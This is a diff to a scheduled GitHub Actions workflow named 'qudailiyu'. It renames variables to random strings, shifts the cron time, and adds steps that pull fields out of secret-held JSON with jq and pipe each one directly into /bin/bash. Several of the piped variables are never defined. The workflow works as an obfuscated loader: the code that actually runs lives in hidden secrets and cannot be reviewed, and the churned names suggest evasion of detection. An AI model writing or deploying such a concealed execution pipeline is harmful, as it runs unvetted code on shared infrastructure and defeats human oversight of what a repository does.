@@ -2,18 +2,20 @@ name: qudailiyu
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 5/6 * * *'
+    - cron: '57 2/6 * * *'
 
-jobs:  # 10837
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: qudailiyu
         env:
-          or96: ${{ secrets.or96 }}
+          tjv5: ${{ secrets.tjv5 }}
         run: |
-          echo $or96 | jq -r .d5616 | /bin/bash
-          echo $depd79833 | jq -r .sll40 | /bin/bash
-          echo $xgwkw03 | jq -r .nl486 | /bin/bash
+          echo $tjv5 | jq -r .djmyp46 | /bin/bash
+          echo $mbfq494 | jq -r .ntm8 | /bin/bash
+          echo $ifyxm2 | jq -r .jidv9 | /bin/bash
+          echo $gy76809 | jq -r .o654 | /bin/bash
+          echo $iich14739 | jq -r .dthk2 | /bin/bash
 
